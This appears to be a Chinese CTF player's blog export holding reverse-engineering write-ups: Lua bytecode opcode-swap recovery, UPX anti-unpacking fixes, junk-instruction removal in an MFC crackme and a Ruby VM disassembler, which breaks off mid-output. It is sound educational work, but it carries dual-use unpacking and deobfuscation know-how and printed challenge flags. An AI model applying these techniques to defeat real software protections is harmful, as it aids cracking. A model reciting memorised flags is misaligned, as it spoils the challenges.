{"pages":[{"title":"About me","text":"HDU在读，现在在 Vidar-Team 搞的是二进制（不会 Pwn），还在努力学习 联系方式： QQ：1802460964","link":"/about/index.html"},{"title":"My Friends","text":"wenzhuan V1N 0x4qE 0x4qE's Blog Switch Liki4 chuj 不好好学习，生活中就会多出许多魔法和奇迹 Summer Rogerthat 逆向┗|｀O′|┛ 嗷~~ Potat0 Potat0 Box Atom 宅男的天台 Klrin Wu Junyi 4nsw3r 4nsw3r‘s Blog","link":"/friends/index.html"}],"posts":[{"title":"近期计划","text":"&nbsp;置顶 数据结构 《深入理解计算机操作系统》 (差不多看了前5章，后面近期不打算看) 《程序员的自我修养》（看了前一半） 《操作系统真象还原》（看到第7章实现中断） angr (学了一点基本的使用，但还不是太会用) pwn heap c++","link":"/2021/07/03/%E8%BF%91%E6%9C%9F%E8%AE%A1%E5%88%92/"},{"title":"L3HCTF luuuuua","text":"L3HCTF luuuuua 的题解，非预期警告 java 层感觉看不出什么，直接从 native 层开始 libluajava​ 一个实现安卓调用 lua 的库，首先寻找加载 lua 字节码的函数 lua_loadfile（反编译后没有这个函数名，根据其他参考项目识别出） 参考项目： https://github.com/jasonsantos/luajava https://github.com/mkottman/AndroLua https://github.com/LuaDist/luajava （最后一个是题目中用到的库，但是赛时编译不出来就没用到） ​ 通过动态调试发现程序加载了 assets 目录下的 logo.jpg，并对其进行解密 ​ 从下图的 fseek 可以得到开始加载的文件偏移 ​ 之后就是解出 luac 文件 字节码替换逆向虚拟机（分析不出来）​ 直接解出来的 luac 文件无法反编译，猜测又是进行了字节码的替换。从库里面能发现可能替换的顺序 ​ 按这样子替换还是无法正确反编译，猜测程序内部虚拟机还改了顺序，但是这个虚拟机有点复杂（主要是源码没编译出来），当时分析了半天也没分析出正确的替换顺序 根据特征手动替换op（非预期）​ 比较 assets 里的 test.lua 与 解密出来的 luac 中的字符串，发现两者都使用了一个 base64 模块，那么就可以根据 test.lua 编译成的字节码进行替换 ​ 光按能对照出来的替换有些函数会反编译不完全，所以还要根据反编译时的错误进行猜测（可以对着像是 tea 类加密的函数猜） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950MOVE ADDLOADK SUBLOADKX MULLOADBOOL MODLOADNIL POWGETUPVAL FORLOOPGETTABUP FORPREPGETTABLE BANDSETTABUP SETTABUPSETUPVAL BXORSETTABLE SHLNEWTABLE SHRSELF EXTRAARGADD MOVESUB LOADKMUL LENMOD MOVEPOW CONCATDIV JMPIDIV EQBAND LTBOR LEBXOR TESTSHL TESTSETSHR CALLUNM TAILCALLBNOT RETURNNOT FORLOOPLEN FORPREPCONCAT TFORCALLJMP TFORLOOPEQ SETLISTLT CLOSURELE BORTEST BXORTESTSET LOADKCALL SHRTAILCALL LOADBOOLRETURN LOADNILFORLOOP GETUPVALFORPREP GETTABUPTFORCALL GETTABLETFORLOOP JMPSETLIST EQCLOSURE SETTABLEVARARG NEWTABLEEXTRAARG SELF粗略换一下用 luadec 里的 luaopswap 替换 op ​ 最终得到以下的反编译结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287-- params : ...-- function num : 0 , upvalues : _ENVlocal base64 = {}if _G.bit32 then local extract = (_G.bit32).extractendif not extract then if _G.bit then local shl, shr, band = (_G.bit).lshift, (_G.bit).rshift, (_G.bit).band do extract = function(v, from, width) -- function num : 0_0 , upvalues : band, shr, shl return band(shr(v, from), shl(1, width) - 1)end end else do if _G._VERSION == &quot;Lua 5.1&quot; then extract = function(v, from, width) -- function num : 0_1 local w = 0 local flag = 2 ^ from for i = 0, width - 1 do local flag2 = flag + flag if flag &lt;= v % flag2 then w = w + 2 ^ i end flag = flag2 end return wend else extract = (load(&quot;return function( v, from, width )\\n\\t\\t\\treturn ( v &gt;&gt; from ) &amp; ((1 &lt;&lt; width) - 1)\\n\\t\\tend&quot;))() end base64.makeencoder = function(s62, s63, spad) -- function num : 0_2 , upvalues : _ENV local encoder = {} for b64code,char in pairs({&quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;, &quot;F&quot;, &quot;G&quot;, &quot;H&quot;, &quot;I&quot;, &quot;J&quot;, &quot;K&quot;, &quot;L&quot;, &quot;M&quot;, &quot;N&quot;, &quot;O&quot;, &quot;P&quot;, &quot;Q&quot;, &quot;R&quot;, &quot;S&quot;, &quot;T&quot;, &quot;U&quot;, &quot;V&quot;, &quot;W&quot;, &quot;X&quot;, &quot;Y&quot;, &quot;Z&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, s62 or &quot;+&quot;, s63 or &quot;/&quot;, spad or &quot;=&quot;; [0] = &quot;A&quot;}) do encoder[b64code] = char:byte() end return encoderend base64.makedecoder = function(s62, s63, spad) -- function num : 0_3 , upvalues : _ENV, base64 local decoder = {} for b64code,charcode in pairs((base64.makeencoder)(s62, s63, spad)) do decoder[charcode] = b64code end return decoderend local DEFAULT_ENCODER = (base64.makeencoder)() local DEFAULT_DECODER = (base64.makedecoder)() local char, concat = string.char, table.concat base64.encode = function(str, encoder, usecaching) -- function num : 0_4 , upvalues : DEFAULT_ENCODER, char, extract, concat if not encoder then encoder = DEFAULT_ENCODER end local t, k, n = {}, 1, #str local lastn = n % 3 local cache = {} for i = 1, n - lastn, 3 do local a, b, c = str:byte(i, i + 2) local v = a * 65536 + b * 256 + c local s = nil if usecaching then s = cache[v] if not s then s = char(encoder[extract(v, 18, 6)], encoder[extract(v, 12, 6)], encoder[extract(v, 6, 6)], encoder[extract(v, 0, 6)]) cache[v] = s end else s = char(encoder[extract(v, 18, 6)], encoder[extract(v, 12, 6)], encoder[extract(v, 6, 6)], encoder[extract(v, 0, 6)]) end t[k] = s k = k + 1 end if lastn == 2 then local a, b = str:byte(n - 1, n) local v = a * 65536 + b * 256 t[k] = char(encoder[extract(v, 18, 6)], encoder[extract(v, 12, 6)], encoder[extract(v, 6, 6)], encoder[64]) else do do if lastn == 1 then local v = str:byte(n) * 65536 t[k] = char(encoder[extract(v, 18, 6)], encoder[extract(v, 12, 6)], encoder[64], encoder[64]) end return concat(t) end end endend base64.decode = function(b64, decoder, usecaching) -- function num : 0_5 , upvalues : DEFAULT_DECODER, _ENV, char, extract, concat if not decoder then decoder = DEFAULT_DECODER end local pattern = &quot;[^%w%+%/%=]&quot; do if decoder then local s62, s63 = nil, nil for charcode,b64code in pairs(decoder) do if b64code == 62 then s62 = charcode else if b64code == 63 then s63 = charcode end end end pattern = (&quot;[^%%w%%%s%%%s%%=]&quot;):format(char(s62), char(s63)) end b64 = b64:gsub(pattern, &quot;&quot;) if usecaching then local cache = {} end local t, k = {}, 1 local n = #b64 local padding = (b64:sub(-2) == &quot;==&quot; and 2) or (b64:sub(-1) == &quot;=&quot; and 1) or 0 for i = 1, padding &gt; 0 and n - 4 or n, 4 do local a, b, c, d = b64:byte(i, i + 3) local s = nil if usecaching then local v0 = a * 16777216 + b * 65536 + c * 256 + d s = cache[v0] if not s then local v = decoder[a] * 262144 + decoder[b] * 4096 + decoder[c] * 64 + decoder[d] s = char(extract(v, 16, 8), extract(v, 8, 8), extract(v, 0, 8)) cache[v0] = s end else do do do local v = decoder[a] * 262144 + decoder[b] * 4096 + decoder[c] * 64 + decoder[d] s = char(extract(v, 16, 8), extract(v, 8, 8), extract(v, 0, 8)) t[k] = s k = k + 1 -- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out DO_STMT -- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out DO_STMT -- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out IF_ELSE_STMT -- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out IF_STMT end end end end end if padding == 1 then local a, b, c = b64:byte(n - 3, n - 1) local v = decoder[a] * 262144 + decoder[b] * 4096 + decoder[c] * 64 t[k] = char(extract(v, 16, 8), extract(v, 8, 8)) else do if padding == 2 then local a, b = b64:byte(n - 3, n - 2) local v = decoder[a] * 262144 + decoder[b] * 4096 t[k] = char(extract(v, 16, 8)) end do return concat(t) end end end endend local strf = string.format local byte, char = string.byte, string.char local spack, sunpack = string.pack, string.unpack local app, concat = table.insert, table.concat local stohex = function(s, ln, sep) -- function num : 0_6 , upvalues : strf, byte, concat if #s == 0 then return &quot;&quot; end if not ln then return s:gsub(&quot;.&quot;, function(c) -- function num : 0_6_0 , upvalues : strf, byte return strf(&quot;%02x&quot;, byte(c)) end) end if not sep then sep = &quot;&quot; end local t = {} for i = 1, #s - 1 do t[#t + 1] = strf(&quot;%02x%s&quot;, s:byte(i), i % ln == 0 and &quot;\\n&quot; or sep) end t[#t + 1] = strf(&quot;%02x&quot;, s:byte(#s)) return concat(t)end local hextos = function(hs, unsafe) -- function num : 0_7 , upvalues : _ENV, char local tonumber = tonumber if not unsafe then hs = (string.gsub)(hs, &quot;%s+&quot;, &quot;&quot;) if (string.find)(hs, &quot;[^0-9A-Za-z]&quot;) or #hs % 2 ~= 0 then error(&quot;invalid hex string&quot;) end end return hs:gsub(&quot;(%x%x)&quot;, function(c) -- function num : 0_7_0 , upvalues : char, tonumber return char(tonumber(c, 16)) end)end local stx = stohex local xts = hextos local ROUNDS = 64 local keysetup = function(key) -- function num : 0_8 , upvalues : _ENV, sunpack, ROUNDS assert(#key == 16) local kt = {0, 0, 0, 0} kt[1] = sunpack(&quot;&gt;I4I4I4I4&quot;, key) local skt0 = {} local skt1 = {} local sum, delta = 0, 2654435769 for i = 1, ROUNDS do skt0[i] = sum + kt[(sum &amp; 3) + 1] sum = sum + delta &amp; 4294967295 skt1[i] = (sum) + kt[((sum) &gt;&gt; 11 &amp; 3) + 1] end do return {skt0 = skt0, skt1 = skt1} end -- DECOMPILER ERROR: 1 unprocessed JMP targetsend local encrypt_u64 = function(st, bu) -- function num : 0_9 , upvalues : ROUNDS local skt0, skt1 = st.skt0, st.skt1 local v0, v1 = bu &gt;&gt; 32, bu &amp; 4294967295 local sum, delta = 0, 2654435769 for i = 1, ROUNDS do v0 = v0 + ((v1 &lt;&lt; 4 ~ v1 &gt;&gt; 5) + v1 ~ skt0[i]) &amp; 4294967295 v1 = v1 + (((v0) &lt;&lt; 4 ~ (v0) &gt;&gt; 5) + (v0) ~ skt1[i]) &amp; 4294967295 end bu = (v0) &lt;&lt; 32 | v1 return buend local enc = function(key, iv, itxt) -- function num : 0_10 , upvalues : _ENV, sunpack, keysetup, encrypt_u64, spack, app, concat assert(#key == 16, &quot;bad key length&quot;) assert(#iv == 8, &quot;bad IV length&quot;) if #itxt == 0 then return &quot;&quot; end local ivu = sunpack(&quot;&lt;I8&quot;, iv) local ot = {} local rbn = #itxt local ksu, ibu, ob = nil, nil, nil local st = keysetup(key) for i = 1, #itxt, 8 do ksu = encrypt_u64(st, ivu ~ i) if rbn &lt; 8 then local buffer = (string.sub)(itxt, i) .. (string.rep)(&quot;\\000&quot;, 8 - rbn) ibu = sunpack(&quot;&lt;I8&quot;, buffer) ob = (string.sub)(spack(&quot;&lt;I8&quot;, ibu ~ ksu), 1, rbn) else ibu = sunpack(&quot;&lt;I8&quot;, itxt, i) ob = spack(&quot;&lt;I8&quot;, ibu ~ ksu) rbn = rbn - 8 end app(ot, ob) end do return concat(ot) end -- DECOMPILER ERROR: 5 unprocessed JMP targetsend -- WARNING: undefined locals caused missing assignments! -- DECOMPILER ERROR: 1 unprocessed JMP targets end endend ​ 可以看出实际上是对输入进行一个异或，抄一下反编译出的函数解密就行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193local base64 = {}local extract = _G.bit32 and _G.bit32.extract -- Lua 5.2/Lua 5.3 in compatibility modeif not extract then if _G.bit then -- LuaJIT local shl, shr, band = _G.bit.lshift, _G.bit.rshift, _G.bit.band extract = function( v, from, width ) return band( shr( v, from ), shl( 1, width ) - 1 ) end elseif _G._VERSION == &quot;Lua 5.1&quot; then extract = function( v, from, width ) local w = 0 local flag = 2^from for i = 0, width-1 do local flag2 = flag + flag if v % flag2 &gt;= flag then w = w + 2^i end flag = flag2 end return w end else -- Lua 5.3+ extract = load[[return function( v, from, width ) return ( v &gt;&gt; from ) &amp; ((1 &lt;&lt; width) - 1) end]]() endendfunction base64.makeencoder( s62, s63, spad ) local encoder = {} for b64code, char in pairs{[0]='A','B','C','D','E','F','G','H','I','J', 'K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y', 'Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n', 'o','p','q','r','s','t','u','v','w','x','y','z','0','1','2', '3','4','5','6','7','8','9',s62 or '+',s63 or'/',spad or'='} do encoder[b64code] = char:byte() end return encoderendfunction base64.makedecoder( s62, s63, spad ) local decoder = {} for b64code, charcode in pairs( base64.makeencoder( s62, s63, spad )) do decoder[charcode] = b64code end return decoderendlocal DEFAULT_ENCODER = base64.makeencoder()local DEFAULT_DECODER = base64.makedecoder()local char, concat = string.char, table.concatfunction base64.encode( str, encoder, usecaching ) encoder = encoder or DEFAULT_ENCODER local t, k, n = {}, 1, #str local lastn = n % 3 local cache = {} for i = 1, n-lastn, 3 do local a, b, c = str:byte( i, i+2 ) local v = a*0x10000 + b*0x100 + c local s if usecaching then s = cache[v] if not s then s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)]) cache[v] = s end else s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)]) end t[k] = s k = k + 1 end if lastn == 2 then local a, b = str:byte( n-1, n ) local v = a*0x10000 + b*0x100 t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[64]) elseif lastn == 1 then local v = str:byte( n )*0x10000 t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[64], encoder[64]) end return concat( t )endfunction base64.decode( b64, decoder, usecaching ) decoder = decoder or DEFAULT_DECODER local pattern = '[^%w%+%/%=]' if decoder then local s62, s63 for charcode, b64code in pairs( decoder ) do if b64code == 62 then s62 = charcode elseif b64code == 63 then s63 = charcode end end pattern = ('[^%%w%%%s%%%s%%=]'):format( char(s62), char(s63) ) end b64 = b64:gsub( pattern, '' ) local cache = usecaching and {} local t, k = {}, 1 local n = #b64 local padding = b64:sub(-2) == '==' and 2 or b64:sub(-1) == '=' and 1 or 0 for i = 1, padding &gt; 0 and n-4 or n, 4 do local a, b, c, d = b64:byte( i, i+3 ) local s if usecaching then local v0 = a*0x1000000 + b*0x10000 + c*0x100 + d s = cache[v0] if not s then local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d] s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8)) cache[v0] = s end else local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d] s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8)) end t[k] = s k = k + 1 end if padding == 1 then local a, b, c = b64:byte( n-3, n-1 ) local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 t[k] = char( extract(v,16,8), extract(v,8,8)) elseif padding == 2 then local a, b = b64:byte( n-3, n-2 ) local v = decoder[a]*0x40000 + decoder[b]*0x1000 t[k] = char( extract(v,16,8)) end return concat( t )endfunction encrypt_u64(st, bu) local skt0, skt1 = st.skt0, st.skt1 local v0, v1 = bu &gt;&gt; 32, bu &amp; 4294967295 local sum, delta = 0, 2654435769 for i = 1, 64 do v0 = v0 + (((v1) &lt;&lt; 4 ~ (v1) &gt;&gt; 5) + (v1) ~ skt0[i]) &amp; 4294967295 v1 = v1 + (((v0) &lt;&lt; 4 ~ (v0) &gt;&gt; 5) + (v0) ~ skt1[i]) &amp; 4294967295 end bu = (v0) &lt;&lt; 32 | v1 return buendfunction keysetup(key) assert(#key == 16) local kt = {0, 0, 0, 0} kt[1],kt[2],kt[3],kt[4] = string.unpack(&quot;&gt;I4I4I4I4&quot;, key) local skt0 = {} local skt1 = {} local sum, delta = 0, 2654435769 for i = 1, 64 do skt0[i] = sum + kt[(sum &amp; 3) + 1] sum = sum + delta &amp; 4294967295 skt1[i] = (sum) + kt[((sum) &gt;&gt; 11 &amp; 3) + 1] end do return {skt0 = skt0, skt1 = skt1} endendfunction dec(key, iv, itxt) assert(#key == 16, &quot;bad key length&quot;) assert(#iv == 8, &quot;bad IV length&quot;) if #itxt == 0 then return &quot;&quot; end local ivu = string.unpack(&quot;&lt;I8&quot;, iv) local ot = {} local rbn = #itxt print(rbn) local ksu, ibu, ob = nil, nil, nil local st = keysetup(key) for i = 1, #itxt, 8 do ksu = encrypt_u64(st, ivu ~ i) if rbn &lt; 8 then local buffer = (string.sub)(itxt, i) .. (string.rep)(&quot;\\000&quot;, 8 - rbn) ibu = string.unpack(&quot;&lt;I8&quot;, buffer) ob = (string.sub)(string.pack(&quot;&lt;I8&quot;, ibu ~ ksu), 1, rbn) print(ob) else ibu = string.unpack(&quot;&lt;I8&quot;, itxt, i) ob = string.pack(&quot;&lt;I8&quot;, ibu ~ ksu) print(ob) rbn = rbn - 8 end table.insert(ot, ob) end do return table.concat(ot,ob) endenddec(&quot;L3H_Sec!@#$%^&amp;*(&quot;,&quot;1qazxsw2&quot;,base64.decode(&quot;LKq2dSc30DKJo99bsFgTkQM9dor1gLl2rejdnkw2MBpOud+38vFkCCF13qY=&quot;)) 由于本人还没有深入了解过 lua 虚拟机的实现以及安卓开发，所以文章中有哪些描述不正确的地方希望大家见谅 参考资料 lua base64模块 https://github.com/mkottman/AndroLua https://github.com/jasonsantos/luajava Android Lua 相互调用 浅析android手游lua脚本的加密与解密","link":"/2021/11/16/L3HCTF-luuuuua/"},{"title":"UPX 壳反解压技术","text":"TSGCTF optimized 中用到的 UPX 壳的反解压 判断是否加壳 不标准的段名，静态链接 找不到输出字符串 entry point 在其他地方 一些通过 upx 压缩的文件可能不会被识别为 upx 压缩过的，基本上是通过更改文件头中的一些数据实现的（可根据 upx -d 的报错判断） upx 文件头结构 12345678910111213141516171819202122232425262728293031struct b_info // 12-byte header before each compressed block{ uint32_t sz_unc; // uncompressed_sizeuint32_t sz_cpr; // compressed_sizeunsigned char b_method; // compression algorithmunsigned char b_ftid; // filter idunsigned char b_cto8; // filter parameterunsigned char b_unused; // unused}; struct l_info // 12-byte trailer in header for loader (offset 116){ uint32_t l_checksum; // checksumuint32_t l_magic; // UPX! magic [55 50 58 21]uint16_t l_lsize; // loader sizeuint8_t l_version; // version infouint8_t l_format; // UPX format }; struct p_info // 12-byte packed program header follows stub loader{ uint32_t p_progid; // program header id [00 00 00 00]uint32_t p_filesize; // filesize [same as blocksize]uint32_t p_blocksize; // blocksize [same as filesize] }; 现在主要伪造的是 p_info ,l_info 里的内容，在b_info 暂时还没有伪造方法 复原 都改成 UPX！ 就能 upx -d 解压了 无法用以上方法复原的情况 可以考虑用 gdb 调试，gcore 命令获取内存状况 也可以尝试用 radare2 解压内存 因为 upx 是开源的，所以有时候压缩方式会遭到更改 参考链接 https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/ https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf","link":"/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/"},{"title":"Xctf进阶-Junk_Instruction","text":"一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数 patch 过的程序 Junk Instruction.exe 找关键函数 首先查找字符串 CDialog ，之后在这个字符串位置下方查看到消息映射表，在 ida 中建立如下两个结构体，分别设置类型 1234567891011121314struct AFX_MSGMAP{ const AFX_MSGMAP* (PASCAL* pfnGetBaseMap)(); const AFX_MSGMAP_ENTRY* lpEntries; //指向下面这个结构体};struct AFX_MSGMAP_ENTRY{ UINT nMessage; UINT nCode; UINT nID; //控件id UINT nLastID; UINT_PTR nSig; AFX_PMSG pfn; //对应的函数}; 使用 Resource Hacker 可以查看 check 按钮对应的 id 十六进制是 0x3e9，有一些文章里说 alt+i 查找控件 id 可以找到对应函数，但是在这题里好像找不到，所以只能根据父类的消息映射表一个个找子类映射表从而找到控件注册函数，具体寻找方法参考这 使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一） 在地址 0x57f730（未经调试）处找到对应的入口点 去花指令 找到函数后确定 check 函数 在 check 函数可以看到 __asm { retn } 的代码，说明这里存在花指令，而这里主要存在两种花指令 call 指令相当于 push+jump，把 call 下方的地址 push 到栈里再 jump 到对应位置，这里 loc_402953 的 ebx 存放返回地址，inc ebx 把返回地址加一那么返回的地址变成 call 下面的 jump，所以这里的花指令可以把除了 mov eax，11111111h 以外的都 nop 掉 这种跟上面一样分析可以全 nop 掉 这题的花指令不算多可以手动修复，当然也可以用 idapython 脚本修复 都弄好后就可以逆 check 的逻辑 解密 rc4加密，密钥是 qwertyuiop 密文是上面的那些赋值 1234567flag=['f','2','5','0','e','3','d','7','5','8','2','0','8','4','7','d','4','2','7','f','3','a','f','1','1','a','7','8','3','3','7','9']for i in range(0,16): temp=flag[i] flag[i]=flag[31-i] flag[31-i]=tempprint('flag{'+''.join(flag)+'}')#flag{973387a11fa3f724d74802857d3e052f} 参考资料 使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一） 使用IDA定位基于MFC的CrackMe的按钮函数-----理论篇","link":"/2021/07/21/Xctf-Junk-Instruction/"},{"title":"CISCN2021 little_evil","text":"国赛题复现 分离出ruby脚本 题目给的是一个 ruby 解释器，由 ruby-packer 打包，binwalk -e 提取出 output.rb 混淆严重，但是大概可以知道前面定义了几个函数，后面那一串是在调用函数。最后那个函数的 send 执行了后面那个参数，可以用 print 打印出来。之后同样还有一层再执行 print 得到最后的程序 开头是$、@的是变量，改一下变量名，可以看出是 vm print 出跳转的表 解 vm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742vmcode='3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644'index=0import rejumptable=[0]*709pattern = re.compile(r'\\d+')raw=&quot;2=&gt;4, 6=&gt;8, 19=&gt;32, 43=&gt;53, 76=&gt;88, 93=&gt;95, 100=&gt;102, 105=&gt;107, 109=&gt;117, 119=&gt;124, 128=&gt;130, 135=&gt;137, 139=&gt;141, 149=&gt;164, 170=&gt;175, 180=&gt;182, 186=&gt;188, 193=&gt;195, 199=&gt;211, 213=&gt;218, 224=&gt;226, 177=&gt;227, 228=&gt;230, 235=&gt;237, 239=&gt;241, 248=&gt;261, 268=&gt;273, 278=&gt;280, 284=&gt;286, 291=&gt;293, 297=&gt;309, 311=&gt;316, 322=&gt;324, 275=&gt;325, 326=&gt;328, 333=&gt;335, 337=&gt;339, 348=&gt;363, 370=&gt;375, 380=&gt;382, 386=&gt;388, 393=&gt;395, 399=&gt;411, 413=&gt;418, 424=&gt;426, 377=&gt;427, 428=&gt;430, 435=&gt;437, 439=&gt;441, 450=&gt;466, 473=&gt;478, 483=&gt;485, 489=&gt;491, 496=&gt;498, 502=&gt;514, 516=&gt;521, 527=&gt;529, 480=&gt;530, 531=&gt;533, 538=&gt;540, 542=&gt;544, 550=&gt;565, 571=&gt;576, 581=&gt;583, 587=&gt;589, 594=&gt;596, 600=&gt;612, 614=&gt;619, 625=&gt;627, 578=&gt;628, 629=&gt;631, 633=&gt;635, 638=&gt;646, 649=&gt;656, 661=&gt;663, 665=&gt;667, 678=&gt;692, 703=&gt;705, 658=&gt;706, 4=&gt;2, 8=&gt;6, 32=&gt;19, 53=&gt;43, 88=&gt;76, 95=&gt;93, 102=&gt;100, 107=&gt;105, 117=&gt;109, 124=&gt;119, 130=&gt;128, 137=&gt;135, 141=&gt;139, 164=&gt;149, 175=&gt;170, 182=&gt;180, 188=&gt;186, 195=&gt;193, 211=&gt;199, 218=&gt;213, 226=&gt;224, 227=&gt;177, 230=&gt;228, 237=&gt;235, 241=&gt;239, 261=&gt;248, 273=&gt;268, 280=&gt;278, 286=&gt;284, 293=&gt;291, 309=&gt;297, 316=&gt;311, 324=&gt;322, 325=&gt;275, 328=&gt;326, 335=&gt;333, 339=&gt;337, 363=&gt;348, 375=&gt;370, 382=&gt;380, 388=&gt;386, 395=&gt;393, 411=&gt;399, 418=&gt;413, 426=&gt;424, 427=&gt;377, 430=&gt;428, 437=&gt;435, 441=&gt;439, 466=&gt;450, 478=&gt;473, 485=&gt;483, 491=&gt;489, 498=&gt;496, 514=&gt;502, 521=&gt;516, 529=&gt;527, 530=&gt;480, 533=&gt;531, 540=&gt;538, 544=&gt;542, 565=&gt;550, 576=&gt;571, 583=&gt;581, 589=&gt;587, 596=&gt;594, 612=&gt;600, 619=&gt;614, 627=&gt;625, 628=&gt;578, 631=&gt;629, 635=&gt;633, 646=&gt;638, 656=&gt;649, 663=&gt;661, 667=&gt;665, 692=&gt;678, 705=&gt;703, 706=&gt;658&quot;m=pattern.findall(raw)#print(m)for i in range(0,len(m)//2): jumptable[int(m[2*i])] = int(m[2*i+1])#print(jumptable)inputindex=0for index in range(0,709): print(str(index)+&quot;: &quot;,end='') if vmcode[index]=='0': print(&quot;inputchar+=1 &quot;,end='') print(inputindex) elif vmcode[index]=='1': print(&quot;inputchar-=1 &quot;,end='') print(inputindex) elif vmcode[index]=='2': print(&quot;input &quot;,end='') print(inputindex) elif vmcode[index]=='3': print(&quot;inputchar index +1 &quot;,end='') inputindex+=1 print(inputindex) elif vmcode[index]=='4': print(&quot;inputchar index -1 &quot;,end='') inputindex-=1 print(inputindex) elif vmcode[index]=='5': print(&quot;if inputchar == 0 jump &quot;+ str(jumptable[index]+1)+' ',end='') print(inputindex) elif vmcode[index]=='6': print(&quot;if inputchar != 0 jump &quot;+ str(jumptable[index]+1)+' ',end='') print(inputindex)'''0: inputchar index +1 11: inputchar index +1 22: if inputchar == 0 jump 5 23: inputchar-=1 24: if inputchar != 0 jump 3 25: inputchar index +1 36: if inputchar == 0 jump 9 37: inputchar-=1 38: if inputchar != 0 jump 7 39: inputchar index -1 210: inputchar index +1 311: inputchar+=1 312: inputchar+=1 313: inputchar+=1 314: inputchar+=1 315: inputchar+=1 316: inputchar+=1 317: inputchar+=1 318: inputchar+=1 319: if inputchar == 0 jump 33 320: inputchar index -1 221: inputchar+=1 222: inputchar+=1 223: inputchar+=1 224: inputchar+=1 225: inputchar+=1 226: inputchar+=1 227: inputchar+=1 228: inputchar+=1 229: inputchar+=1 230: inputchar index +1 331: inputchar-=1 332: if inputchar != 0 jump 20 333: inputchar index -1 234: inputchar+=1 235: 36: inputchar index +1 337: inputchar+=1 338: inputchar+=1 339: inputchar+=1 340: inputchar+=1 341: inputchar+=1 342: inputchar+=1 343: if inputchar 